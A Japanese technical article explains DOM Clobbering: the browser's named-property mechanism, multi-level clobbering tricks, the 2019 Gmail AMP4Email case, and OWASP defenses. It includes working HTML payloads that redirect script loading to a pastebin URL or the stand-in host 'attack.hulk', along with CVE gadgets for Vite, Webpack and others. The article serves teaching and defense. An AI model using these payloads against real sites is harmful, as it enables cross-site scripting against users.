## DOM Clobbering

### 概要:「スクリプトなしのXSS」という一見矛盾した攻撃

DOM Clobbering(DOMクロバリング)は、`<script>`タグや`javascript:`スキーム、イベントハンドラ属性(`onerror`等)を**一切使わずに**、静的なHTMLマークアップの注入だけでJavaScriptの実行フローを乗っ取る攻撃手法です。日本語で「clobber」は「叩き潰す・上書きする」の意で、その名の通り、既存の正規スクリプトが参照するはずの変数やプロパティを、攻撃者が注入したHTML要素で**すり替える(上書きする)**ところに本質があります。

多くのXSS防御(HTMLサニタイザによる`<script>`除去、CSPの`script-src`制限)は「スクリプトの実行そのものを防ぐ」ことに主眼を置いています。ところがDOM Clobberingは新しいスクリプトを注入しません。**すでにページ上で動いている正規のJavaScript**が参照する値を書き換え、そのコードを「攻撃者の意図した通りに」誤動作させます。したがって、`<a>`や`<form>`、`<img>`といった「無害に見えるタグ」しか許可しないサニタイザ設定を通り抜け、CSPで`<script>`をブロックしていても成立し得ます。研究コミュニティではこの性質から「code-reuse(コード再利用)攻撃」「scriptless(スクリプトなし)injection」とも呼ばれます。

DOM Clobbering Collectionの定義を引用します。

> "DOM Clobbering is a type of code-less injection attack on the web where attackers first inject a seemingly benign, scriptless HTML markup into a webpage."(DOM Clobberingとは、攻撃者がまず一見無害でスクリプトを含まないHTMLマークアップをWebページに注入する、コード無しのインジェクション攻撃の一種である)

本節では、攻撃を成立させるブラウザの中核機構(名前付きプロパティアクセス)を仕組みレベルで解説し、実際に野生で発見された著名な脆弱性(Gmail AMP4Email)、体系化された防御策(OWASP Cheat Sheet)、研究コミュニティが収集した実在ガジェット集(DOM Clobbering Collection)という3つの一次資料をもとに、原理から実践的防御までを一気通貫で扱います。

---

### 仕組みの核心:名前付きプロパティアクセス(Named Property Access)

DOM Clobberingを理解する唯一かつ最大の鍵は、HTML仕様(WHATWG HTML Standard)が定義する「**名前付きプロパティアクセス**」という、極めて古くからある(そして今も互換性のため残っている)ブラウザ挙動です。

ブラウザはDOMツリーを構築するとき、`id`属性、あるいは一部の要素の`name`属性を持つHTML要素について、その属性値を**キー**として`document`オブジェクトや`window`(グローバル)オブジェクトに**自動的にアクセサ(参照)を生やします**。つまり、HTMLを1行書くだけで、対応する名前のグローバル変数・プロパティが勝手に生成されるのです。

OWASP Cheat Sheetの例を引用します。

```html
<form id=x></form>
```

```javascript
// すべて同じ<form>要素を指す:
var obj1 = document.getElementById('x');
var obj2 = document.x;
var obj3 = window.x;
var obj4 = x;            // 明示的な宣言なしにグローバル参照になる
console.log(obj1 === obj2 && obj2 === obj3 && obj3 === obj4); // true
```

**なぜ動くのか。** HTML仕様は、後方互換性(古いWebサイトが`document.formName`のようにフォームへ直接アクセスしていた時代の名残)のために、名前付き要素を`document`/`window`のプロパティとして露出させることを規定しています。ここで決定的に重要なのは、OWASPが強調する次の性質です。

> "named element references take precedence over built-in APIs and developer-defined attributes during property lookups."(名前付き要素の参照は、プロパティ探索時に組み込みAPIや開発者定義の属性よりも優先される)

厳密には、`window`/`document`のプロパティ解決順序において、これらの「名前付きプロパティ」は**そのプロパティがまだ定義されていない(=`undefined`である)場合**に露出します。したがって開発者が「まだ代入していないグローバル変数」や「オプショナルな設定オブジェクト」を前提にコードを書いていると、攻撃者はそこにHTML要素を割り込ませることができます。

`window`側と`document`側で、露出のトリガーとなる属性が異なる点も押さえておきましょう。仕様上、`window`に載るのは主に`id`属性(および`embed`/`form`/`img`/`object`の`name`属性)、`document`に載るのは`embed`/`form`/`iframe`/`img`/`object`等の`name`属性(および`id`)です。この違いが、後述する`document.getElementById`のような**組み込みAPI自体の上書き**に効いてきます。

```html
<img name=cookie>
<embed name=getElementById></embed>
```
```javascript
console.log(document.cookie);         // <img name="cookie"> 要素そのものが返る
console.log(document.getElementById); // <embed name="getElementById"> が返る(関数ではなくなる)
```

> 出典: DOM Clobbering Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
> 出典: Can HTML affect JavaScript? Introduction to DOM clobbering(Beyond XSS / Huli)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/

#### 単純な悪用例:分岐とスクリプトロードの乗っ取り

OWASPが挙げる最小の悪用例を見ます。まず、未定義前提の変数を使った分岐です。

```javascript
let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);
```

開発者の意図は「`window.redirectTo`が設定されていればそこへ、なければ`/profile/`へ」。しかし`window.redirectTo`は通常`undefined`なので、攻撃者が以下を注入すると乗っ取れます。

```html
<a id=redirectTo href='javascript:alert(1)'></a>
<!-- オープンリダイレクトなら: -->
<a id=redirectTo href='phishing.com'></a>
```

**なぜ動くのか。** `<a id=redirectTo>`により`window.redirectTo`は`<a>`要素を指すようになります。`location.assign()`は文字列を期待しますが、要素を渡すと内部で文字列化(`toString()`)されます。`<a>`要素の`toString()`は**その`href`属性の値(解決済みURL)を返す**という特別な挙動を持つため、`javascript:alert(1)`という文字列がそのまま`location.assign`に渡り、スクリプトが実行されます。この「`<a>`/`<area>`の`toString()`が`href`を返す」性質は、DOM Clobberingで**任意の文字列を注入する**ための最重要テクニックです。

次に、より危険なスクリプトの動的ロード乗っ取り。

```javascript
var script = document.createElement('script');
let src = window.config.url || 'script.js';
script.src = src;
document.body.appendChild(script);
```

```html
<a id=config><a id=config name=url href='malicious.js'></a>
```

**なぜ動くのか。** ここでは`window.config`が(存在すれば)`.url`プロパティを持つオブジェクトであることを前提にしています。攻撃者は`config`という「入れ物」と、その中の`url`という「中身」の**2階層**を作らねばなりません。これを実現するのが、次に述べる多階層クロバリングです。

> 出典: DOM Clobbering Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

---

### 多階層クロバリング:`a.b.c`のようなネストしたプロパティを作る

実アプリでは`window.config.url`や`AMP_MODE.test`のように、**ドットで連なる**プロパティ参照が普通です。単一の要素では`window.x`しか作れませんが、次の3つのテクニックで2〜3階層のプロパティ木を「HTMLだけで」構築できます。

#### テクニック1:同一`id`の重複でHTMLCollectionを作る

同じ`id`を持つ要素を複数配置すると、`window.<id>`は単一要素ではなく`HTMLCollection`(要素の集合)になります。`HTMLCollection`は、その中の要素の`name`属性値でメンバーアクセスできるため、疑似的な「2階層目」を作れます。

```html
<a id="config"></a>
<a id="config" name="apiUrl" href="https://example.com"></a>
```
```javascript
console.log(config.apiUrl + '') // "https://example.com"
```

**なぜ動くのか。** `id="config"`が2つあるので`window.config`は`HTMLCollection`になります。`HTMLCollection.apiUrl`は、`name="apiUrl"`を持つメンバー要素(2つめの`<a>`)を返します。その`<a>`を文字列化(`+ ''`)すると`href`値が得られる、という前述の`toString()`挙動の合わせ技です。

#### テクニック2:`<form>` + `<input>`で本物のネストを作る

`<form>`要素は、その内部のフォーム部品(`<input>`等)に`name`でアクセスできる「コンテナ」として振る舞います。これを使うと`config.prod.apiUrl.value`のような**3階層**が作れます。

```html
<form id="config"></form>
<form id="config" name="prod">
  <input name="apiUrl" value="123" />
</form>
```
```javascript
console.log(config.prod.apiUrl.value) // "123"
```

**なぜ動くのか。** `id="config"`が2つ→`window.config`は`HTMLCollection`。`config.prod`は`name="prod"`の2つめの`<form>`。`<form>`はその配下の名前付き部品を露出するので`config.prod.apiUrl`は`<input>`要素、`.value`でその`value`属性値`"123"`が読めます。`<input>.value`は**任意の文字列を格納できる**ため、`href`の`toString`だけでは作りにくい文字列(スペースや特殊文字を含む値)を運ぶのに有用です。

#### テクニック3:`<iframe srcdoc>`でさらに階層を稼ぐ

さらに深い階層や、`window`直下の別名前空間が必要な場合、`<iframe>`の`name`と`srcdoc`(インラインHTML)を組み合わせます。

```html
<iframe name="moreLevel" srcdoc='
  <form id="config"></form>
  <form id="config" name="prod">
    <input name="apiUrl" value="123" />
  </form>
'></iframe>
```
```javascript
setTimeout(() => {
  console.log(moreLevel.config.prod.apiUrl.value) // "123"
}, 500)
```

**なぜ動くのか。** `<iframe name="moreLevel">`により`window.moreLevel`はそのiframeの`contentWindow`を指します。iframe内部のHTMLは`srcdoc`で独立した文書として構築され、その中で作ったクロバリング木に`moreLevel.config.prod...`と外側からたどれます。`setTimeout`で待つのは、iframeの読み込み(内部DOM構築)が非同期だからです。この手法はネストの深さを事実上無制限にできる反面、非同期になる点が実戦での制約になります。

> 出典: Can HTML affect JavaScript? Introduction to DOM clobbering(Beyond XSS)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/

---

### 実戦ケーススタディ:Gmail AMP4Email の XSS(Michał Bentkowski, 2019)

DOM Clobberingが「理論上の面白ネタ」ではなく、Googleが「awesome」と評した実害あるXSSを生むことを示した金字塔的事例が、Michał Bentkowski(Securitum)によるGmailのAMP4Email脆弱性です。

#### 背景:AMP4Emailと、なぜスクリプトが使えないのか

AMP4Email(dynamic mail / 動的メール)は、Gmailのメール本文にインタラクティブなHTMLを埋め込める仕組みです。メールという極めて危険な配信経路でHTMLを許すため、Googleは二重三重の防御を敷いていました。

- **AMPバリデータ**: `<script>`やイベントハンドラ、任意のCSS等を禁止し、AMP独自の許可タグ・属性しか通さない。
- **CSP(Content-Security-Policy)**: 万一スクリプトが紛れ込んでも実行元を制限。

つまり「普通のXSS」は入口で全滅する設計です。Bentkowskiが着目したのは、**バリデータが`id`属性そのものは禁止していなかった**点でした。`id`が使えるなら、DOM Clobberingの土俵に持ち込める――ここから調査が始まります。

#### 突破口:`AMP_MODE`という許可された名前

AMP4EmailはDOM Clobbering対策として、`AMP`など一部の`id`値を禁止していました。しかしBentkowskiは、内部の設定オブジェクト`AMP_MODE`がこの禁止リストから漏れていることを発見します。`<a id=AMP_MODE>`を仕込むと、コンソールに興味深いエラーが現れました。AMPの内部コードが以下のようなパターンでスクリプトのURLを組み立てていたのです(記事で示された、AMPソースに相当するコード)。

```javascript
var script = window.document.createElement("script");
script.async = false;
var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation;
} else {
    loc = window.location;
}
if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist";
} else {
    loc = "https://cdn.ampproject.org";
}
var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion + "/" + singlePass + "v0/" + pluginName + ".js";
document.head.appendChild(b);
```

`AMP_MODE`が正規のコードで参照されており、しかもその値が**スクリプトのロード先URLの組み立て**に使われている――これはDOM Clobberingにとって理想的なsinkです。

#### メカニズムの分解:URLをどう乗っ取るか

`<a id=AMP_MODE>`だけを置くと、`AMP_MODE`は`<a>`要素になります。すると`AMP_MODE.rtvVersion`は`undefined`となり、URLは次のように壊れます。

```
https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js
```

コンソールに現れた`undefined`は、「攻撃者がこのオブジェクトを掌握できている」動かぬ証拠でした。ここから、URLを完全に攻撃者側へ向けるために2つのフラグを`truthy`(真と評価される値)にし、ロード先(`loc`)を差し替えます。

1. `AMP_MODE.test` を truthy にする → 分岐が`window.testLocation`を見るようになる。
2. `AMP_MODE.localDev` を truthy にする → `loc = loc.protocol + "//" + loc.host + "/dist"` の枝に入る。
3. `window.testLocation` 自体もクロバリングし、その`protocol`(や`host`)を攻撃者URLにする。

これを実現する注入HTMLが以下です。

```html
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>
<a id="testLocation"></a>
<a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

**なぜ動くのか(1行ずつ)。**
- `id="AMP_MODE"`が2つ→`window.AMP_MODE`は`HTMLCollection`。
- `AMP_MODE.localDev`は`name="localDev"`の`<a>`要素で、要素オブジェクトは`truthy`。よって`if (AMP_MODE.localDev)`が成立。
- `AMP_MODE.test`も同様に`truthy`。`window.testLocation`も次の要素で存在するので`if (AMP_MODE.test && window.testLocation)`が成立し、`loc = window.testLocation`。
- `id="testLocation"`が2つ→`testLocation`も`HTMLCollection`。`testLocation.protocol`は`name="protocol"`の`<a>`。`loc.protocol`はその`<a>`の`href`の`toString()`で`"https://pastebin.com/raw/0tn8z0rG#"`となる。
- 末尾の`#`は続く`"//" + loc.host + ...`をフラグメント(URLの`#`以降=サーバーに送られない部分)に押し込み、結果としてスクリプトが`https://pastebin.com/...`(攻撃者が中身を制御できるJS)からロードされる。

この一連の流れは、単一要素の`window.x`しか作れないはずのDOM Clobberingで、**多階層プロパティ・truthy分岐の操作・`<a>`の`toString`によるURL文字列注入**という主要テクニックを総動員した好例です。

#### 結末とCSPという最後の壁、そして影響

Bentkowskiはスクリプトのロード先を攻撃者側へ向けることに成功しましたが、**AMP環境のCSP**がロードされるスクリプトの実行元を制限していたため、公開PoCの段階では「完全な任意JS実行」までは至らなかったと各報告は記しています。それでもGoogleはこの発見を高く評価しました。要旨として、**サニタイザとバリデータで固めた"スクリプト禁止"環境が、`id`属性の見落としとDOM Clobbering一つで根底から揺らぐ**ことを証明した点に価値があります。

タイムライン(公開情報):
- 2019年8月15日: Googleへ報告
- 2019年8月16日: 初期受領
- 2019年9月10日: Google「the bug is awesome, thanks for reporting!」
- 2019年10月12日: 修正確認
- 2019年11月18日: 一般公開(報奨金 $5,000)

> ⚠️ **一次資料へのアクセスについて**: 一次資料 `research.securitum.com/xss-in-amp4email-dom-clobbering/`(Bentkowski本人の記事)は現在 `securitum.com` のランディングページへ302リダイレクトされ、本文を直接取得できませんでした。URL: https://research.securitum.com/xss-in-amp4email-dom-clobbering/ 上記の技術的内容は、同記事を精緻に再現しているBeyond XSS(Huli)、および SecurityAffairs / SecurityWeek の報道から復元しています。

> 出典: XSS in GMail's AMP4Email via DOM Clobbering(Michał Bentkowski / Securitum)— https://research.securitum.com/xss-in-amp4email-dom-clobbering/
> 出典: Can HTML affect JavaScript?(Beyond XSS)— https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/
> 出典: Google addressed an XSS flaw in Gmail defining it awesome(SecurityAffairs)— https://securityaffairs.com/94030/hacking/google-xss-flaw-2.html

---

### 実在ガジェット集:DOM Clobbering Collection

「理屈は分かった。では現実のライブラリにこんな穴が本当にあるのか?」という問いに、jackfromeast と ishmeal が維持する **DOM Clobbering Collection** が答えます。これは、HTMLインジェクションに弱い、あるいはDOM Clobberingガジェット(攻撃者がクロバリングで悪用できる正規コードの断片)を含むクライアントサイドライブラリを体系的にまとめたリポジトリです。

#### 圧倒的に多いパターン:`currentScript` クロバリング

収集された多数のガジェットで、繰り返し登場する最頻出パターンが `document.currentScript` の悪用です。ライブラリは「自分自身がどのURLからロードされたか」を知るために`document.currentScript.src`を読み、そこから相対的に追加のスクリプト/リソースのURLを組み立てることがよくあります。攻撃者は`name="currentScript"`を持つ`<img>`を注入して`document.currentScript`をその要素にすり替え、`src`を攻撃者URLにします。

主要なCVE付き実例(いずれも2024年に採番):

| ライブラリ | バージョン | ペイロード | 影響 | CVE |
|---|---|---|---|---|
| Vite | v5.4.5 | `<img src="https://attack.hulk" name="currentScript">` | XSS | CVE-2024-45812 |
| Webpack | v5.93.0 | `<img name="currentScript" src="https://attack.hulk"></img>` | XSS | CVE-2024-43788 |
| rollup | v4.21.3 | `<img src="https://attack.hulk" name="currentScript">` | XSS | CVE-2024-47068 |
| Prism | v1.29.0 | `<img name="currentScript" src="https://attack.hulk/a.js"></img>` | XSS | CVE-2024-53382 |
| layui | v2.9.16 | `<img name="currentScript" src="https://attack.hulk">` | XSS | CVE-2024-47075 |
| rspack | v1.0.0-rc.0 | `<img name="currentScript" src="https://attack.hulk"></img>` | XSS | CVE-2024-43788 |

**なぜ`<img>`で動くのか。** ライブラリのブートストラップコードは概ね `var src = document.currentScript.src; loadMore(src + '/chunk.js')` のような形をとります。攻撃者のHTMLが本来より先(または適切な位置)に置かれ、`document.currentScript`が`undefined`または上書き可能な状況だと、`name="currentScript"`の`<img>`が返り、その`.src`は`<img>`の`src`属性=攻撃者URLです。結果として後続スクリプトが攻撃者ドメインからロードされXSSに至ります。Vite/Webpack/rollupといった**モダンなフロントエンドの中核ツール**が軒並み該当した事実は、このガジェットが「例外」ではなく「構造的に頻出する」ことを物語ります。

#### 複数要素・a要素id型のガジェット

`currentScript`以外にも、複数`name`同名要素で`scripts`コレクションを作る型や、`<a id=...>`で設定URLを差し込む型があります。

```html
<!-- Astro v4.5.9 (CVE-2024-47885): 同名フォーム2つで scripts を作る -->
<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>

<!-- seajs v3.0.3 (CVE-2024-51091): 同名imgで scripts コレクション -->
<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">

<!-- UMeditor v1.2.2 (CVE-2024-53387): a要素idで設定URLを上書き -->
<a id="UMEDITOR_HOME_URL" href="https://attack.hulk/"></a>

<!-- plotly.js v2.35.2: 2階層(HTMLCollection + name)でBASE_URLを注入(CSRF) -->
<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://attack.hulk/?a="></a>

<!-- MathJax v2 (Accepted, XSS): id重複 + name=root -->
<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.hulk"></a>
```

これらはすべて、本節で解説した「HTMLCollection化」「`name`によるメンバーアクセス」「`<a>`の`toString`=`href`」という同一原理の応用です。ペイロードの見た目が違っても、**やっていることは同じ**だと見抜けることが重要です。

#### HTMLインジェクション×サニタイザという別ルート

Collectionはガジェットだけでなく、「ユーザー入力を受け取りHTMLとして出力するが、`id`/`name`属性を残してしまう」ライブラリも列挙しています。注目すべきは、**DOMPurifyを使っていても**該当するケースがある点です。

| ライブラリ | バージョン | サニタイザ | 残る能力 |
|---|---|---|---|
| mermaid | v0.1.4 | DOMPurify | 任意の名前付きプロパティ |
| tui.editor | v3.2.2 | DOMPurify | 任意の名前付きプロパティ |
| TinyMCE v5/6/7 | v7.3.0 | DOMPurify | 任意の名前付きプロパティ |
| Froala | v4.2.2 | DOMPurify | 任意の`name`属性 |

**なぜDOMPurifyでも残るのか。** DOMPurifyはデフォルトでは`id`/`name`属性を「無害な属性」として許可します(危険なのはスクリプト実行系だから)。DOM Clobbering対策は**明示的にオプトインしないと効かない**(後述の`SANITIZE_NAMED_PROPS`)ため、既定設定のまま使うとクロバリング用マークアップが通過してしまいます。これはサニタイザ利用者が最も陥りやすい落とし穴です。

Collectionは学術研究とも接続しています。攻撃手法・実態・防御を体系化した論文 "It's (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses"(Soheil Khodayari, Giancarlo Pellegrino)や、記号的DOMモデリングによる動的解析ツールを提案した "The DOMino Effect"(Zhengyu Liu ほか)、教育資料としてDOM Clobbering Wiki(domclob.xyz)やHuliの記事が参照されています。

> 出典: dom-clobbering-collection(jackfromeast / ishmeal)— https://github.com/jackfromeast/dom-clobbering-collection

---

### 防御:OWASP DOM Clobbering Prevention Cheat Sheet

OWASPは防御を「サニタイズ層」「コーディング層」の二段構えで整理しています。単一の銀の弾丸はなく、**多層防御(defense in depth)**が前提です。

#### 防御1:HTMLサニタイズで`id`/`name`を無害化する

最も直接的なのは、注入されるHTMLの`id`/`name`が既存のグローバル/document/フォームのプロパティと衝突しないようにすることです。

**DOMPurify(名前空間隔離):**
```javascript
var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
```
これを有効にすると、DOMPurifyは名前付きプロパティに`user-content-`という接頭辞を付与し、`window.config`のような正規コードの参照とは**別の名前空間**へ隔離します。前述の通り**デフォルトでは無効**なので明示指定が必須です。DOMPurifyの内部では、以下のようなチェックでクロバリングを弾く実装も存在します。

```javascript
if (SANITIZE_DOM &&
    (lcName === 'id' || lcName === 'name') &&
    (value in document || value in formElement)) {
  return false; // documentやformの既存プロパティ名と衝突する id/name を拒否
}
```

**Sanitizer API(属性ブロック):**
```javascript
const sanitizerInstance = new Sanitizer({
  blockAttributes: [
    {'name': 'id', elements: '*'},
    {'name': 'name', elements: '*'}
  ]
});
containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
```
ただしOWASPは、ブラウザ標準のSanitizer APIは**デフォルト状態ではDOM Clobberingを防がない**と明記しています。`id`/`name`を明示的にブロックする設定を自分で加える必要があります。

#### 防御2:CSP(部分的緩和にとどまる)

`script-src`でスクリプトの実行元を厳格に制限すれば、「攻撃者URLからのスクリプトロード」型のガジェット(`currentScript`型など)は緩和できます。ただしOWASPは、CSPは**一部の変種しか防げない**と釘を刺します。AMP4Email事例が示すように、CSPは最後の砦にはなり得ますが、`location.assign`への`javascript:`注入やCSRF型など、スクリプトを新たにロードしない攻撃には無力なこともあります。

#### 防御3:オブジェクトの凍結

```javascript
Object.freeze(sensitiveObject);
```
`Object.freeze`した後は、そのオブジェクトのプロパティを名前付きプロパティで上書きできなくなります。ただし「守るべきオブジェクトを漏れなく列挙する」のは現実には困難、とOWASPは補足しています。

#### 防御4〜13:安全なコーディング規約

サニタイザに頼りきらず、**そもそもクロバリングされない書き方**をすることが根本対策です。OWASPの主要項目を要約します。

- **明示的な変数宣言(#5):** `let redirectTo = '/profile/'` のように、必ず初期値を持つローカル/明示変数を使う。`window.x || default` の「未定義前提」を避ける。
- **document/windowを変数置き場にしない(#6):** アプリの状態をグローバルに載せない。
- **使用前の型チェック(#7, #8):** 名前付きプロパティは常にHTML要素として現れるので、要素かどうかで弾ける。
  ```javascript
  if (typeof window.config === 'object' && window.config instanceof Object) {
    // 安全に使用可
  }
  // あるいは
  let src = (window.config instanceof Object && window.config.url)
    ? window.config.url
    : 'script.js';
  ```
  **なぜ有効か。** クロバリングで注入されるのは`HTMLElement`/`HTMLCollection`です。期待するのが「プレーンなオブジェクト」なら`instanceof`や厳密な型判定でHTML要素を除外できます(ただし要素も`instanceof Object`は真になるため、`instanceof HTMLElement`で明示的に**拒否**する方が確実な場面もあります)。
- **strictモード(#9):** `'use strict'` で暗黙のグローバル生成を禁止し、読み取り専用への代入をエラーにする。
- **フィーチャ検出(#10)/ローカルスコープ優先(#11)/ユニークな変数名(#12):** `__appConfig__`のような衝突しにくい名前や、クロージャによるカプセル化(#13)で露出面を減らす。
  ```javascript
  const AppConfig = (() => {
    const config = {url: 'script.js'};
    return { getUrl: () => config.url };
  })();
  ```
  **なぜ有効か。** クロージャ内のローカル変数は`window`/`document`のプロパティにならないため、名前付きプロパティで到達できません。

> 出典: DOM Clobbering Prevention Cheat Sheet(OWASP)— https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

---

### まとめ:攻撃者・防御者それぞれの視点

DOM Clobberingの本質は、「HTMLとJavaScriptが`window`/`document`の名前付きプロパティを通じて**意図せず接続している**」という、ブラウザの後方互換仕様にあります。攻撃者にとっての着眼点は3つです。

1. **`id`/`name`が通るHTMLインジェクション点**があるか(サニタイザのデフォルト設定が甘くないか)。
2. 正規コードが**未定義前提のグローバル/設定オブジェクト**(`window.config`, `AMP_MODE`, `document.currentScript`等)を参照していないか。
3. その値が**危険なsink**(`script.src`, `location`, `innerHTML`)へ流れていないか。

防御者は逆に、この3点のいずれかを断ちます。サニタイザで`SANITIZE_NAMED_PROPS`を有効化し、`window.x || default`のような書き方を排し、設定はクロージャに閉じ込め、CSPを最後の砦に置く――どれか一つではなく、**すべてを重ねる**ことが、Gmail級の堅牢な環境ですら破られた歴史から得られる教訓です。
